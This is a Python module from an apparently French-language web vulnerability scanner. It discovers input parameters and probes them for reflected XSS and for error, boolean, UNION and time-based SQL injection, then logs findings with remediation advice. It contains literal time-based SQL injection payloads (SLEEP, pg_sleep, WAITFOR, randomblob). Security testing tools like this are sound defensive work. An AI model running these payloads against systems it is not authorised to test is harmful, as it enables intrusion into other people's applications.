def _test_time_sqli(session, candidate, original, timeout, baseline_time):
    """Test for time-based blind SQL injection.

    Sends SLEEP/WAITFOR/pg_sleep payloads and measures response time.
    A positive is confirmed when the response takes TIME_THRESHOLD seconds
    longer than the measured baseline.
    """
    original = str(original or "1")
    sleep_s = TIME_SLEEP_SECONDS

    time_payloads = [
        # MySQL / General
        f"{original}' AND SLEEP({sleep_s})-- -",
        f"{original} AND SLEEP({sleep_s})-- -",
        f"' AND SLEEP({sleep_s})-- -",
        # PostgreSQL
        f"{original}' AND pg_sleep({sleep_s})-- -",
        f"{original} AND pg_sleep({sleep_s})-- -",
        # SQL Server
        f"{original}'; WAITFOR DELAY '0:0:{sleep_s}';-- -",
        # SQLite
        f"{original}' AND 1=randomblob(100000000)-- -",
    ]

    for payload in time_payloads:
        try:
            _, elapsed = _timed_send(session, candidate, payload, timeout)
        except (requests.exceptions.RequestException, requests.exceptions.Timeout):
            # Timeout itself could indicate a successful sleep
            continue

        extra_delay = elapsed - baseline_time
        if extra_delay >= TIME_THRESHOLD:
            return (
                True,
                f"Le payload temporel a provoqué un délai de {elapsed:.1f}s "
                f"(baseline: {baseline_time:.1f}s, surplus: {extra_delay:.1f}s). "
                f"Cela indique une injection SQL aveugle basée sur le temps.",
            )

    return False, ""


# ─── Deduplication helper ────────────────────────────────────────────────────

def _insert_once(
    cursor, scan_id, inserted, key, type_faille, criticite, description, remediation
):
    if key in inserted:
        return False
    inserted.add(key)
    add_vulnerability(cursor, scan_id, type_faille, criticite, description, remediation)
    return True


# ─── Main Entry Point ────────────────────────────────────────────────────────

def tester_injections(url_cible, options=None, _ctx=None):
    """Discover and test GET/POST inputs for reflected XSS and SQL injection.

    Detection methods:
    - XSS: Reflected payload detection with canary pre-check, expanded payloads,
      HTML-decoded reflection check, and event handler detection.
    - SQLi Error-based: Break-string payloads that trigger SQL error messages.
    - SQLi Boolean-based: True/false payload pairs with relaxed comparison.
    - SQLi UNION-based: Column count probing + UNION SELECT with marker.
    - SQLi Time-based: SLEEP/pg_sleep/WAITFOR payloads with timing analysis.
    """
    options = options or {}
    root = normalize_target_url(url_cible)
    crawl_root = get_scope_root(url_cible)
    def _opt(key, env_key, default):
        """Resolve option value, handling 0 correctly (0 is a valid value, not falsy)."""
        val = options.get(key)
        if val is not None:
            return int(val)
        env_val = os.getenv(env_key)
        if env_val is not None:
            return int(env_val)
        return default

    timeout = _opt("timeout", "SCANNER_TIMEOUT", DEFAULT_TIMEOUT)
    max_pages = _opt("max_pages", "SCANNER_MAX_PAGES", DEFAULT_MAX_PAGES)
    max_candidates = _opt("max_candidates", "SCANNER_MAX_CANDIDATES", DEFAULT_MAX_CANDIDATES)
    max_time_probes = _opt("max_time_probes", "SCANNER_MAX_TIME_PROBES", DEFAULT_MAX_TIME_PROBES)

    print(f"[*] Démarrage des tests d'injection sur : {root}")
    if crawl_root != root:
        print(f"  [i] Portée de découverte: {crawl_root}")

    session = build_session(options)

    if _ctx:
        conn, cursor, scan_id = _ctx
    else:
        conn = connect_db()
        cursor = conn.cursor()
        scan_id = None

    try:
        if not _ctx:
            scan_id, target_url = start_scan(cursor, root)
            conn.commit()
        else:
            target_url = root

        xss_candidates, sqli_candidates = _build_candidates(
            url_cible,
            session,
            target_url,
            crawl_root,
            timeout,
            max_pages,
            max_candidates,
        )
        print(
            f"  [i] Candidats XSS: {len(xss_candidates)} | Candidats SQLi: {len(sqli_candidates)}"
        )

        inserted = set()
        findings = 0

        # ── Phase 1: XSS ─────────────────────────────────────────────────
        print("  [>] Phase 1 : Test XSS...")
        for candidate in xss_candidates:
            # Step 1: Quick canary check — if the input doesn't reflect at all,
            # skip all payloads for this candidate (huge speed improvement).
            reflects, _ = _canary_reflects(session, candidate, timeout)
            if not reflects:
                continue

            for payload in XSS_PAYLOADS:
                try:
                    response = _send_candidate(session, candidate, payload, timeout)
                except requests.exceptions.RequestException:
                    continue

                if _is_auth_redirect(response, candidate["url"]):
                    break  # No point testing more payloads if auth-redirected

                if _contains_raw_xss(response.text, payload):
                    path = urlparse(candidate["url"]).path or "/"
                    description = (
                        f"Le paramètre '{candidate['param']}' reflète du HTML/JavaScript non échappé "
                        f"sur {candidate['method'].upper()} {path}. Cela permet l'exécution de script côté navigateur."
                    )
                    key = (
                        "xss",
                        candidate["method"],
                        candidate["url"],
                        candidate["param"],
                    )
                    if _insert_once(
                        cursor,
                        scan_id,
                        inserted,
                        key,
                        "Injection XSS (Réfléchie)",
                        "Élevé",
                        description,
                        "Encoder toutes les sorties HTML, valider les entrées côté serveur, éviter l'insertion directe dans le DOM et déployer une Content-Security-Policy restrictive.",
                    ):
                        findings += 1
                        print(
                            f"  [+] XSS détectée: {candidate['method'].upper()} {path} param={candidate['param']}"
                        )
                    break

        # Commit XSS findings immediately so they appear in dashboard
        conn.commit()

        # ── Phase 2: SQLi ─────────────────────────────────────────────────
        print("  [>] Phase 2 : Test SQLi...")
        time_probes_used = 0

        for candidate in sqli_candidates:
            original = candidate.get("base_data", {}).get(candidate["param"], "1")

            # Get baseline response
            baseline = None
            baseline_time = 1.0  # default assumption
            try:
                baseline, baseline_time = _timed_send(
                    session, candidate, original, timeout
                )
            except requests.exceptions.RequestException:
                pass

            detected = False
            evidence = ""
            method_name = ""

            # ── 2a: Error-based SQLi ──────────────────────────────────────
            for error_payload in _sqli_error_payloads(original):
                try:
                    error_response = _send_candidate(
                        session, candidate, error_payload, timeout
                    )
                except requests.exceptions.RequestException:
                    continue
                if _is_auth_redirect(error_response, candidate["url"]):
                    break
                baseline_status = baseline.status_code if baseline is not None else 200
                if _contains_sql_error(error_response.text):
                    detected = True
                    evidence = "Un payload de rupture de chaîne provoque une erreur SQL visible."
                    method_name = "Error-based"
                    break
                if baseline_status < 500 and error_response.status_code >= 500:
                    # A 500 triggered by a SQL-breaking payload is suspicious,
                    # but only confirmed if the body contains SQL error strings.
                    if _contains_sql_error(error_response.text):
                        detected = True
                        evidence = "Un payload de rupture de chaîne provoque une erreur serveur contenant des messages SQL."
                        method_name = "Error-based"
                    else:
                        # Generic 500 without SQL error — could be WAF, input
                        # validation, or framework error.  Report as possible.
                        detected = True
                        evidence = (
                            "Un payload de rupture de chaîne provoque une erreur serveur (HTTP 500). "
                            "Aucun message SQL explicite n'a été détecté dans la réponse — "
                            "il peut s'agir d'une injection SQL non confirmée ou d'une erreur de validation."
                        )
                        method_name = "Error-based (non confirmé)"
                    break

            # ── 2b: Boolean-based SQLi ────────────────────────────────────
            if not detected:
                for true_payload, false_payload in _sqli_payload_pairs(original):
                    try:
                        true_response = _send_candidate(
                            session, candidate, true_payload, timeout
                        )
                        false_response = _send_candidate(
                            session, candidate, false_payload, timeout
                        )
                    except requests.exceptions.RequestException:
                        continue

                    if _is_auth_redirect(
                        true_response, candidate["url"]
                    ) or _is_auth_redirect(false_response, candidate["url"]):
                        break

                    detected, evidence = _is_boolean_sqli(
                        baseline, true_response, false_response
                    )
                    if detected:
                        method_name = "Boolean-based"
                        break

            # ── 2c: UNION-based SQLi ──────────────────────────────────────
            if not detected:
                detected, evidence = _test_union_sqli(
                    session, candidate, original, timeout
                )
                if detected:
                    method_name = "UNION-based"

            # ── 2d: Time-based blind SQLi ─────────────────────────────────
            if not detected and time_probes_used < max_time_probes:
                time_probes_used += 1
                detected, evidence = _test_time_sqli(
                    session, candidate, original, timeout, baseline_time
                )
                if detected:
                    method_name = "Time-based blind"

            # ── Record finding ────────────────────────────────────────────
            if detected:
                path = urlparse(candidate["url"]).path or "/"
                # Unconfirmed error-based (generic 500 without SQL error strings)
                # is downgraded to Moyen — it could be WAF/validation, not real SQLi.
                if "non confirmé" in method_name:
                    severity = "Moyen"
                else:
                    severity = "Critique"
                description = (
                    f"Le paramètre '{candidate['param']}' semble influencer une requête SQL sur "
                    f"{candidate['method'].upper()} {path}. "
                    f"Méthode de détection: {method_name}. "
                    f"Indice: {evidence}"
                )
                key = (
                    "sqli",
                    candidate["method"],
                    candidate["url"],
                    candidate["param"],
                )
                if _insert_once(
                    cursor,
                    scan_id,
                    inserted,
                    key,
                    "Injection SQL (SQLi)",
                    severity,
                    description,
                    "Utiliser des requêtes préparées/paramétrées, éviter toute concaténation SQL avec l'entrée utilisateur, valider les types attendus et limiter les privilèges du compte base de données.",
                ):
                    findings += 1
                    conn.commit()
                    print(
                        f"  [+] SQLi détectée ({method_name}): {candidate['method'].upper()} {path} param={candidate['param']}"
                    )

        if not _ctx:
            finish_scan(conn, cursor, scan_id, "Terminé")
        print(
            f"[*] Exploitation terminée. {findings} faille(s) active(s) sauvegardée(s)."
        )

    except Exception as exc:
        print(f"  [X] Erreur exploitation : {exc}")
        if not _ctx and scan_id is not None:
            finish_scan(conn, cursor, scan_id, "Erreur")
    finally:
        if not _ctx:
            conn.close()


if __name__ == "__main__":
    tester_injections("http://localhost")
